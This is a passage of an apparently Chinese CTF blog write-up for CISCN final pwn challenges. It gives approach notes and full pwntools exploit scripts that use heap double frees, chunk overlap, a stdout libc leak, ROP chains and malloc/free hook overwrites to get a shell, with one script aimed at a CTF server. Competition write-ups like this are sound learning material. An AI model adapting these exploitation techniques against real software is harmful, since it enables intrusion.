"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index ?"</span>, str(index))</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">openat_offset = libc.sym[<span class="string">"openat"</span>]</span><br><span class="line">read_offset = libc.sym[<span class="string">"read"</span>]</span><br><span class="line">write_offset = libc.sym[<span class="string">"write"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf02a4</span></span><br><span class="line">pop_7regs = <span class="number">0x401186</span> <span class="comment"># add rsp, 8; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401193</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401191</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">pop_rsp_r13_r14_r15 = <span class="number">0x000000000040118d</span> <span class="comment"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdx_offset = <span class="number">0x0000000000001b92</span> <span class="comment"># pop rdx ; ret (in libc)</span></span><br><span class="line">read_plt = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">bss = elf.bss(<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop chain</span></span><br><span class="line">payload = flat([pop_rdi, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss, <span class="number">0</span>])</span><br><span class="line">payload += flat([read_plt])</span><br><span class="line">payload += flat([pop_rsp_r13_r14_r15, bss])</span><br><span class="line">p.sendafter(<span class="string">"what is your name? "</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">new(<span class="number">0x500</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">new(<span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin double free</span></span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">addr = show(<span class="number">0</span>)[:<span class="number">-1</span>]</span><br><span class="line">main_arena = u64(addr.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - <span class="number">0x58</span> - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line"><span class="comment"># one_gadget = libc_base + one_gadget_offset</span></span><br><span class="line">pop_rdx = libc_base + pop_rdx_offset</span><br><span class="line">libc_openat = libc_base + openat_offset</span><br><span class="line">libc_read = libc_base + read_offset</span><br><span class="line">libc_write = libc_base + write_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">new(<span class="number">0x68</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"EEEE"</span>)</span><br><span class="line">new(<span class="number">0x68</span>, <span class="string">"A"</span> * <span class="number">0x13</span> + p64(pop_7regs))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __malloc_hook</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size?"</span>, str(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set gadgets on bss (using orw)</span></span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdi, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x100</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0</span>])</span><br><span class="line">payload += flat([libc_openat]) <span class="comment"># open "/flag"</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">3</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x110</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([libc_read]) <span class="comment"># read flag</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">1</span>])</span><br><span class="line">payload += flat([pop_rsi_r15, bss + <span class="number">0x110</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rdx, <span class="number">0x40</span>])</span><br><span class="line">payload += flat([libc_write]) <span class="comment"># print flag</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload += <span class="string">"/flag\x00"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"pop_rdx: "</span> + hex(pop_rdx))</span><br><span class="line">success(<span class="string">"libc_write: "</span> + hex(libc_write))</span><br><span class="line">success(<span class="string">"libc_read: "</span> + hex(libc_read))</span><br><span class="line">success(<span class="string">"libc_openat: "</span> + hex(libc_openat))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-5"><a href="#ciscn-final-5" class="headerlink" title="ciscn_final_5"></a>ciscn_final_5</h1><h2 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2><p>经典没有<code>show</code>的题目，bruteforce 4 bits，partial write unsorted bin-&gt;bk为stdout的做法，主要是堆布局需要点时间，写起来有点pwnable.tw上realloc的感觉了，不过显然更简单。</p><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><ol><li>利用题目储存<code>chunk</code>地址以及<code>index</code>的逻辑是两者异或之后再存入<code>chunk_array</code>中空闲的地方，若<code>index == 0x10 &amp;&amp; chunk_addr &amp; 0x10 == 0</code>，那么就可以在edit的时候，实际写的地址要向后移0x10 bytes，从而可以溢出到下一个chunk的<code>fd</code>的部分。</li><li>利用这个溢出，改掉下一个chunk的size，造成更大的chunk overlap，使得一个chunk同时存在tcache bin和unsorted bin中（间接链入unsorted bin）。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsorted bin --&gt; +--------+</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 |        |</span><br><span class="line">                 +--------+                      +--------+ &lt;-- tcache bin</span><br><span class="line">                 |        | &#x3D;&#x3D;&gt; victim_chunk &lt;&#x3D;&#x3D; |        |</span><br><span class="line">                 +--------+                      +--------+</span><br></pre></td></tr></table></figure></li><li>由于在切割unsorted bin，使得victim_chunk的fd，bk被置入<code>main_arena+0x58</code>之后，需要进行partial write，故这里仍要需要利用<code>index == 0x10 &amp;&amp; chunk_addr &amp; 0x10 == 0</code>的方法进行0x10 bytes overflow，从从而可以覆盖到<code>victim_chunk-&gt;fd</code>。</li><li>分配到<code>stdout</code>的chunk之后，写入<code>p64(0xfbad1800) + p64(0) * 3 + &quot;\x00&quot;</code>就可以leak libc了。</li><li>之后继续利用0x10 bytes overflow，分配<code>__free_hook</code>的chunk，写入<code>system</code>，再<code>free</code>一个”/bin/sh”的chunk，就可以getshell了。</li></ol><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">offset =  <span class="number">0x3eb780</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bruteforce 4 bits</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># prepare two useful chunks</span></span><br><span class="line">        new(<span class="number">10</span>, <span class="number">0x58</span>, <span class="string">"nop"</span>)</span><br><span class="line">        new(<span class="number">11</span>, <span class="number">0x58</span>, <span class="string">"nop"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># first chunk (overlap)</span></span><br><span class="line">        new(<span class="number">16</span>, <span class="number">0x18</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create overlap</span></span><br><span class="line">        new(<span class="number">2</span>, <span class="number">0x3F8</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        new(<span class="number">3</span>, <span class="number">0xF8</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        new(<span class="number">4</span>, <span class="number">0x18</span>, <span class="string">"DDDD"</span>) <span class="comment"># avoid merging to top chunk</span></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># free the chunk with index 16</span></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unsorted bin</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># malloc from unsorted bin (overlap)</span></span><br><span class="line">        new(<span class="number">16</span>, <span class="number">0x3F8</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># partial write unsorted bin-&gt;bk ==&gt; stdout</span></span><br><span class="line">        edit(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">"A"</span> * <span class="number">0x3D8</span> + p64(<span class="number">0x101</span>) + p16(<span class="number">0x5760</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># malloc chunk at stdout</span></span><br><span class="line">        new(<span class="number">5</span>, <span class="number">0xF8</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">        new(<span class="number">6</span>, <span class="number">0xF8</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p.recv(<span class="number">3</span>) == <span class="string">"low"</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">                p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26969</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">                <span class="keyword">if</span> _debug == <span class="number">1</span>:</span><br><span class="line">                    gdb.attach(p, gdbscript=_source)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        p.recv(<span class="number">0x20</span> - <span class="number">3</span>)</span><br><span class="line">        libc_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">        libc_base = libc_addr - offset</span><br><span class="line">        __free_hook = libc_base + __free_hook_offset</span><br><span class="line">        libc_system = libc_base + system_offset</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">            p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">26969</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">if</span> _debug == <span class="number">1</span>:</span><br><span class="line">                gdb.attach(p, gdbscript=_source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin is broken</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">new(<span class="number">16</span>, <span class="number">0x58</span>, <span class="string">"HHHH"</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x48</span> + p64(<span class="number">0x61</span>) + p64(__free_hook))</span><br><span class="line">new(<span class="number">12</span>, <span class="number">0x58</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">new(<span class="number">13</span>, <span class="number">0x58</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"><span class="comment"># success(": " + hex())</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-final-6"><a href="#ciscn-final-6" class="headerlink" title="ciscn_final_6"></a>ciscn_final_6</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>有点坑，题目给的libc是2.23，搞得我直接用2.23写了fastbin attack，然后打远程发现有tcache，才发现题目上写Ubuntu 18的环境。题目本身还是很简单的。</p><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><ol><li>解迷宫，拿到<code>malloc</code>的地址，从而得到libc地址。</li><li><code>new game</code>会创造一个新的<code>player</code>信息，先进行<code>store game</code>，然后<code>delete record</code>将当前的<code>player</code>删除，此时再依次<code>load game</code>和<code>delete record</code>，将被delete掉的<code>player</code>进行二次删除，构成tcache double free。</li><li><code>malloc</code>位于<code>__free_hook</code>的chunk，写为<code>system</code>，然后<code>free</code>一个”/bin/sh”的chunk，getshell。</li></ol><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resume</span><span class="params">(count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"0"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(name, count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"what's your name?"</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(index, count, ops)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"input you ops count"</span>, str(count))</span><br><span class="line">    <span class="keyword">if</span> count != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"ops: "</span>, ops)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store</span><span class="params">(flag, size, comment)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line">        p.sendafter(<span class="string">"any comment?"</span>, <span class="string">'y'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"comment size?"</span>, str(size))</span><br><span class="line">        p.sendafter(<span class="string">"plz input comment"</span>, comment)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">"any comment?"</span>, <span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index?"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_user</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(maze, start, end, sol)</span>:</span></span><br><span class="line">    <span class="comment"># arrive at end</span></span><br><span class="line">    <span class="keyword">if</span> start == end:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move right if possible</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">1</span>] + <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>]][start[<span class="number">1</span>] + <span class="number">1</span>] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>], start[<span class="number">1</span>] + <span class="number">1</span>), end, sol):</span><br><span class="line">            sol.append(<span class="string">'D'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move down</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">0</span>] + <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>] + <span class="number">1</span>][start[<span class="number">1</span>]] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>] + <span class="number">1</span>, start[<span class="number">1</span>]), end, sol):</span><br><span class="line">            sol.append(<span class="string">'S'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move left</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">1</span>] - <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>]][start[<span class="number">1</span>] - <span class="number">1</span>] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>], start[<span class="number">1</span>] - <span class="number">1</span>), end, sol):</span><br><span class="line">            sol.append(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># move up</span></span><br><span class="line">    <span class="keyword">if</span> start[<span class="number">0</span>] - <span class="number">1</span> &lt;= <span class="number">41</span> <span class="keyword">and</span> maze[start[<span class="number">0</span>] - <span class="number">1</span>][start[<span class="number">1</span>]] != <span class="string">'x'</span>:</span><br><span class="line">        maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">'x'</span></span><br><span class="line">        <span class="keyword">if</span> solve(maze, (start[<span class="number">0</span>] - <span class="number">1</span>, start[<span class="number">1</span>]), end, sol):</span><br><span class="line">            sol.append(<span class="string">'W'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_maze</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"9"</span>)</span><br><span class="line">    maze = p.recvuntil(<span class="string">"x"</span> * <span class="number">42</span>)</span><br><span class="line">    maze += p.recvuntil(<span class="string">"x"</span> * <span class="number">42</span> + <span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">    maze = 